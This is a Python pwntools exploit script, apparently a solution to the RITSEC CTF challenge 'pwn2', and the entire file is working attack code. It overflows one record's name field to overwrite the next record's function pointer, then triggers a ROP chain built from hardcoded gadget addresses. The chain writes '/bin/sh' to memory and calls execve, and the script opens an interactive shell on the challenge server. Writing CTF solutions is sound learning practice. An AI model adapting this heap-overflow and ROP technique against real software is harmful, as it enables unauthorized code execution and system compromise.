from pwn import *


def set_eax(eax):
    # 0x8049f16 : pop eax ; ret
    return ''.join([
        p32(0x8049f16),
        p32(eax)
    ])


def set_ebx(ebx):
    # 0x8048ea9 : pop ebx ; ret
    return ''.join([
        p32(0x8048ea9),
        p32(ebx)
    ])


def set_ecx(ecx):
   # 0x804ea93 : pop ecx ; add esp, 0x44 ; ret
    return ''.join([
        p32(0x804ea93),
        p32(ecx),
        'A' * 0x44
    ])


def write(addr, val):
    # 0x804ff2a : mov dword ptr [ebx], eax ; ret
    return ''.join([
        set_eax(val),
        set_ebx(addr),
        p32(0x804ff2a)
    ])


def write_str(addr, s):
    while len(s) % 4 != 0:
        s += '\0'

    return ''.join([
        write(addr + i, u32(s[i:i + 4]))
        for i in xrange(0, len(s), 4)
    ])


def do_syscall(n):
    # This also zeros edx which we want for execve()
    # 0x809626e : xor edx, edx ; int 0x80
    return ''.join([
        set_eax(n),
        p32(0x809626e)
    ])


def switch_stack():
    # 0x80c0620 : pop ebp ; add al, 0x89 ; pop esp ; and al, 0x30 ; add esp, 0x24 ; ret
    return ''.join([
        p32(0x80c0620),
        'A' * 0x20
    ])


def make_rop():
    # 0x81950E1 is just some writable memory
    shell_path = 0x81950E1
    path_ptr = shell_path + 12

    return ''.join([
        switch_stack(),
        write_str(shell_path, '/bin/sh'),
        write(path_ptr, shell_path),
        set_ebx(shell_path),
        set_ecx(path_ptr),
        do_syscall(constants.linux.i386.SYS_execve)
    ])


def create_person(r, name, age):
    r.recvuntil('Enter your choice: ')
    r.sendline('1')
    r.recvuntil('Enter name length: ')
    r.sendline(str(len(name)))
    r.recvuntil('Enter person\'s name: ')
    r.sendline(name)
    r.recvuntil('Enter person\'s age: ')
    r.sendline(str(age))


def edit_person(r, i, name):
    r.recvuntil('Enter your choice: ')
    r.sendline('2')
    r.recvuntil('Enter person\'s index (0-based): ')
    r.sendline(str(i))
    r.recvuntil('Enter new name length: ')
    r.sendline(str(len(name)))
    r.recvuntil('Enter the new name: ')
    r.sendline(name)


def view_person(r, i):
    r.recvuntil('Enter your choice: ')
    r.sendline('3')
    r.recvuntil('Enter person\'s index (0-based): ')
    r.sendline(str(i))


# r = process('./pwn2')
r = remote('fun.ritsec.club', 1337)

# Allocate 2 people
create_person(r, 'a', 1)
create_person(r, 'a', 1)

# Change the name of the first person to overwrite the second's function pointer
edit_person(r, 0, 'A' * 16 + make_rop())

# View the second person to execute the ROP chain
view_person(r, 1)

# Get shell
r.interactive()
